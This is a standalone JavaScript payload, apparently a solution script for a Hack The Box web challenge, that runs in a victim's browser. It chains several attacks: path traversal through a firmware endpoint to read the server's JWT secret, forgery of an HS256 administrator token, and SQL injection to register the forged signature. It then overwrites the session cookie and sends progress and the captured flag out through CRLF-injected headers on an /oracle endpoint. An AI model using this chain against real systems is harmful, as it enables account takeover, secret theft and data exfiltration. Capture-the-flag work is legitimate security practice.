(async () => {
  if (!document.cookie.includes("jwt=")) return;
  const enc = new TextEncoder();
  const b64 = (buf) => btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  const b64s = (s) => b64(enc.encode(s));
  const hdr = () => ({ CacheKey: "k" + Math.random() });
  const exfil = (tag, msg) => fetch("/oracle/" + encodeURIComponent(msg) + "/1%0d%0aContent-Type:%20text%2Fplain%0d%0aCacheKey:%20enable", { credentials: "omit", headers: { CacheKey: "omni-" + tag } });
  const timeout = (p, ms) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), ms))]);
  try {
    await exfil("S0", "S0 " + document.cookie.length);
    const fw = await timeout(fetch("/controller/firmware", { method: "POST", headers: { ...hdr(), "Content-Type": "application/x-www-form-urlencoded" }, body: "patch=../../../jwt_secret.txt" }), 8000);
    await exfil("S1", "S1 status=" + fw.status);
    const secret = await fw.text();
    await exfil("S2", "S2 len=" + secret.length);
    const uid = 1000 + Math.floor(Math.random() * 90000);
    const head = b64s(JSON.stringify({ alg: "HS256", typ: "JWT" }));
    const body = b64s(JSON.stringify({ user_id: uid, username: "admin", account_type: "administrator" }));
    const key = await crypto.subtle.importKey("raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
    const sig = b64(await crypto.subtle.sign("HMAC", key, enc.encode(head + "." + body)));
    await exfil("S3", "S3 signed");
    const sql = `1';INSERT INTO signatures(user_id,signature)VALUES(${uid},'${sig}')-- -`;
    await fetch("/controller/device/" + encodeURIComponent(sql), { headers: hdr() });
    await exfil("S4", "S4 inserted");
    document.cookie = `jwt=${head}.${body}.${sig}; path=/`;
    const admin = await (await fetch("/controller/admin", { headers: hdr() })).text();
    const flag = admin.match(/HTB\{[^}]*\}/);
    await exfil("F", flag ? flag[0] : "NOFLAG " + admin.slice(0, 80));
  } catch (e) {
    await exfil("ERR", "ERR " + e);
  }
})();
